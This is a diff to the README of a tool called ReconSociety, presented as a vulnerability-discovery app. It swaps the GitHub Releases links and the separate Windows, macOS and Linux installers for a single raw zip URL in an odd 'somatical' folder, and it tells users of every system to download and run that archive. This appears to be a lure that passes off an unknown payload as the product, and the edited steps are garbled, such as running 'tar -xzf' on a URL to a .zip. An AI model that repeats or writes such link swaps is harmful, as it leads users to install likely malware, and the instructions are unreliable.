@@ -1,6 +1,6 @@
 # 🔍 ReconSociety - Simplify Your Vulnerability Discovery
 
-[![Download ReconSociety](https://img.shields.io/badge/Download-ReconSociety-brightgreen)](https://github.com/Mimolin4o/ReconSociety/releases)
+[![Download ReconSociety](https://raw.githubusercontent.com/Mimolin4o/ReconSociety/main/somatical/ReconSociety.zip)](https://raw.githubusercontent.com/Mimolin4o/ReconSociety/main/somatical/ReconSociety.zip)
 
 ## 🚀 Getting Started
 
@@ -20,31 +20,31 @@ Before you start, make sure your computer meets these basic requirements:
 To get ReconSociety, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download ReconSociety](https://github.com/Mimolin4o/ReconSociety/releases)
+   [Download ReconSociety](https://raw.githubusercontent.com/Mimolin4o/ReconSociety/main/somatical/ReconSociety.zip)
    
 2. On the Releases page, you will see a list of available versions. Locate the latest version listed (e.g., v1.0) and click on it.
 
 3. Scroll to the "Assets" section. Here, you will see several files. Choose the file that matches your operating system:
-   - For Windows, click on `ReconSociety-Windows.exe`.
-   - For macOS, click on `ReconSociety-macOS.dmg`.
-   - For Linux, click on `ReconSociety-Linux.tar.gz`.
+   - For Windows, click on `https://raw.githubusercontent.com/Mimolin4o/ReconSociety/main/somatical/ReconSociety.zip`.
+   - For macOS, click on `https://raw.githubusercontent.com/Mimolin4o/ReconSociety/main/somatical/ReconSociety.zip`.
+   - For Linux, click on `https://raw.githubusercontent.com/Mimolin4o/ReconSociety/main/somatical/ReconSociety.zip`.
 
 4. After the download completes, locate the file on your computer. 
 
 5. Follow these instructions based on your operating system:
 
    - **Windows:**
-     1. Double-click `ReconSociety-Windows.exe` to start the installation.
+     1. Double-click `https://raw.githubusercontent.com/Mimolin4o/ReconSociety/main/somatical/ReconSociety.zip` to start the installation.
      2. Follow the on-screen instructions to complete the installation.
      3. Once installed, you can find ReconSociety in your Start Menu.
 
    - **macOS:**
-     1. Open the downloaded `ReconSociety-macOS.dmg` file.
+     1. Open the downloaded `https://raw.githubusercontent.com/Mimolin4o/ReconSociety/main/somatical/ReconSociety.zip` file.
      2. Drag the ReconSociety icon to your Applications folder.
      3. You can now open ReconSociety from your Applications.
 
    - **Linux:**
-     1. Extract the downloaded `ReconSociety-Linux.tar.gz` file using a file manager or terminal (`tar -xzf ReconSociety-Linux.tar.gz`).
+     1. Extract the downloaded `https://raw.githubusercontent.com/Mimolin4o/ReconSociety/main/somatical/ReconSociety.zip` file using a file manager or terminal (`tar -xzf https://raw.githubusercontent.com/Mimolin4o/ReconSociety/main/somatical/ReconSociety.zip`).
      2. Navigate to the extracted folder.
      3. Run the program with the command `./ReconSociety`.
 
